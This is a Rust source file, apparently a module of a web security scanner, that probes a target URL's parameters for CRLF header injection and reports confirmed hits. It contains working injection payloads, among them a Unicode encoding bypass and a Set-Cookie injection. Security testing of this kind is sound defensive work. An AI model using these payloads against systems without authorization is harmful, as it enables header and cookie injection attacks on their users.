use colored::*;
use crate::core::client::HttpClient;
use crate::core::analyzer::Analyzer;

/// CRLF Injection detection — header injection via %0d%0a
pub async fn detect(target: &str) -> anyhow::Result<()> {
    println!("{} Testing: CRLF Injection", "[*]".yellow());

    let params = Analyzer::extract_params(target);
    if params.is_empty() {
        println!("{} No parameters found for CRLF testing", "[i]".cyan());
        return Ok(());
    }

    let client = HttpClient::new()?;
    let canary_header = format!("X-LZR-{}", rand::random::<u16>());

    let payloads = vec![
        format!("%0d%0a{}:injected", canary_header),
        format!("%0D%0A{}:injected", canary_header),
        format!("\\r\\n{}:injected", canary_header),
        format!("%E5%98%8A%E5%98%8D{}:injected", canary_header), // Unicode CRLF bypass
        format!("%0d%0aSet-Cookie:lzr=pwned", ),
    ];

    for (param_name, original_val) in &params {
        for payload in &payloads {
            let full = format!("{}{}", original_val, payload);
            let url = Analyzer::inject_param(target, param_name, &full)?;
            let result = Analyzer::send_and_analyze(&client, &url, "").await?;

            // Check if our injected header appears in response headers
            let header_injected = result.response_headers.keys()
                .any(|k| k.to_lowercase().contains(&canary_header.to_lowercase()));
            let cookie_injected = result.response_headers.get("set-cookie")
                .map(|v| v.contains("lzr=pwned"))
                .unwrap_or(false);

            if header_injected || cookie_injected {
                println!(
                    "{} CONFIRMED: CRLF Injection in param '{}'",
                    "[!]".red().bold(), param_name
                );
                println!("    Payload: {}", payload);
                if cookie_injected {
                    println!("    Impact: Cookie injection via Set-Cookie header");
                }
                return Ok(());
            }
        }
    }

    Ok(())
}
